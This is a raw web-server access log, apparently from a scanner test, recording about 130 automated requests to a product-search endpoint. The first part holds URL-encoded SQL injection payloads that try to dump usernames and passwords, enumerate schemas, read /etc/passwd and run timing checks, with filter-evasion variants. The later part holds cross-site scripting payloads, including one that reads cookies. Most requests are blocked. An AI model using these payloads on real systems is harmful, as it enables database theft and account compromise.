172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=1%27%20AND%20%28SELECT%201%20FROM%20users%20WHERE%20username%20LIKE%20%27adm%25%27%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20AND%20%28SELECT%201%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20AND%202%3E1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=1%20AND%20%28SELECT%20COUNT%28%2A%29%3E0%20FROM%20users%29 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20NULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20NULL%2CNULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:05 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20username%2Cpassword%2C3%20FROM%20users-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20table_name%2C2%2C3%20FROM%20information_schema.tables-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20column_name%2C2%2C3%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=1%20UNION%20SELECT%20NULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=1%20UNION%20ALL%20SELECT%20NULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=1%27%20UNION%20SELECT%20%40%40version%2CNULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%201%2Cgroup_concat%28table_name%29%2C3%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:06 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%201%2Cgroup_concat%28username%2C0x3a%2Cpassword%29%2C3%20FROM%20users-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=1%20UNION%20SELECT%20NULL%2CNULL--%20- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20load_file%28%27%2Fetc%2Fpasswd%27%29%2C2%2C3-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=1%20UNION%20ALL%20SELECT%201%2Cschema_name%2C3%20FROM%20information_schema.schemata-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20NULL%2Cversion%28%29%2CNULL-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3%20FROM%20information_schema.tables%20LIMIT%201-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20user%28%29%2C2%2C3-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%20UNION%20SELECT%20NULL%2Ctable_name%2CNULL%20FROM%20information_schema.tables-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=1%20UNION%20SELECT%201%2C2%2C%40%40datadir-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:07 +0000] "GET /rest/products/search?q=%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=%27%3B%20IF%281%3D1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=1%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=%27%3B%20SELECT%20SLEEP%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=1%20AND%20SLEEP%285%29 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=%27%20AND%20SLEEP%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=1%27%20AND%20SLEEP%285%29--%20- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=%27%20OR%20SLEEP%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:08 +0000] "GET /rest/products/search?q=1%20OR%20SLEEP%285%29 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=1%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=%27%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=%27%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=1%20AND%20IF%281%3D1%2CSLEEP%285%29%2C0%29 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=%27%20OR%20IF%281%3D1%2CSLEEP%285%29%2C0%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=%27%3B%20SELECT%20pg_sleep%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:09 +0000] "GET /rest/products/search?q=1%3B%20SELECT%20pg_sleep%285%29 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%3B%20IF%281%3D1%29%20SELECT%20SLEEP%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%3B%20SELECT%201%20WHERE%201%3D1%20AND%20SLEEP%285%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%20AND%201%3D%28SELECT%201%20FROM%20%28SELECT%20SLEEP%285%29%29a%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%2509OR%25091%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%2F%2A%2150000OR%2A%2F1%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%7C%7C1%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%20OR%250a1%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:10 +0000] "GET /rest/products/search?q=%27%20OR%201%20LIKE%201-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20OR%201%20REGEXP%201-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20OR%201%20BETWEEN%200%20AND%202-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20OR%20GREATEST%281%2C0%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20OR%20ELT%281%2C1%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20UN%2F%2A%2A%2FION%20SEL%2F%2A%2A%2FECT%201%2C2-- HTTP/1.1" 500 988 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%20%2F%2A%21UNION%2A%2F%20%2F%2A%21SELECT%2A%2F%201%2C2-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%2BOR%2B1%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:11 +0000] "GET /rest/products/search?q=%27%252527OR%2525271%253D1-- HTTP/1.1" 500 998 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%20OR%20COALESCE%28NULL%2C1%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%20AND%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%200%20END%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%20OR%202%20IN%20%281%2C2%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%7C%7C%28SELECT%201%20FROM%20dual%20WHERE%201%3D1%29%7C%7C%27 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%20OR%20%28SELECT%201%20FROM%20%28SELECT%201%29a%29%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%27%20OR%20ASCII%281%29%3D49-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:12 +0000] "GET /rest/products/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Csvg%20onload%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Cbody%20onload%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:13 +0000] "GET /rest/products/search?q=%3Cscript%3Ealert%281%29%2F%2F HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Cscript%20type%3D%22text%2Fjavascript%22%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Ca%20href%3D%22javascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Cdiv%20onmouseover%3D%22alert%281%29%22%3Ehover%3C%2Fdiv%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Cinput%20type%3D%22text%22%20onfocus%3D%22alert%281%29%22%20autofocus%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:14 +0000] "GET /rest/products/search?q=%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%601%60%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cbody%20onresize%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cbody%20onhashchange%3Dalert%281%29%3E%3Ca%20href%3D%23x%3Etrigger%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cbody%20onfullscreenchange%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Cselect%20onfocus%3Dalert%281%29%20autofocus%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:15 +0000] "GET /rest/products/search?q=%3Ctextarea%20onfocus%3Dalert%281%29%20autofocus%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cvideo%20onloadstart%3Dalert%281%29%3E%3Csource%3E%3C%2Fvideo%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Caudio%20onloadstart%3Dalert%281%29%3E%3Csource%3E%3C%2Faudio%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cdetails%20ontoggle%3Dalert%281%29%20open%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cmarquee%20onstart%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cdiv%20onmouseenter%3Dalert%281%29%3Ehover%3C%2Fdiv%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cform%20onsubmit%3Dalert%281%29%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cbutton%20onclick%3Dalert%281%29%3Eclick%3C%2Fbutton%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cobject%20onerror%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:16 +0000] "GET /rest/products/search?q=%3Cbody%20onpageshow%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Csvg%3E%3Cset%20onbegin%3Dalert%281%29%20attributeName%3Dx%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Ciframe%20onload%3Dalert%281%29%20src%3Dabout%3Ablank%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Clink%20rel%3Dstylesheet%20onerror%3Dalert%281%29%20href%3D%2F%2Fdoesnotexist.invalid%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22%26%2397%3Blert%281%29%22%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Csvg%3E%3Cscript%3Ealert%26lpar%3B1%26rpar%3B%3C%2Fscript%3E%3C%2Fsvg%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:17 +0000] "GET /rest/products/search?q=%3Cimg%20src%3Dx%20onERROR%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3CIMG%20SRC%3Dx%20OnErRoR%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Ca%20href%3Dj%26%2397%3Bvascript%3Aalert%281%29%3Eclick%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Ca%20href%3D%22jav%26%23x09%3Bascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Ca%20href%3D%22jav%26%23x0A%3Bascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Ca%20href%3D%22jav%26%23x0D%3Bascript%3Aalert%281%29%22%3Eclick%3C%2Fa%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fbutton%3E%3C%2Fform%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Cembed%20src%3Djavascript%3Aalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Csvg%3E%3Ca%20xlink%3Ahref%3Djavascript%3Aalert%281%29%3E%3Crect%20width%3D100%20height%3D100%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:18 +0000] "GET /rest/products/search?q=%3Cmath%20href%3Djavascript%3Aalert%281%29%3Eclick%3C%2Fmath%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:19 +0000] "GET /rest/products/search?q=%3Cimg%20%22%22%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:19 +0000] "GET /rest/products/search?q=%3Cscript%3Ealert%281%29%3C%21-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:19 +0000] "GET /rest/products/search?q=%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:22:18:19 +0000] "GET /rest/products/search?q=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%281%29%22%3E HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
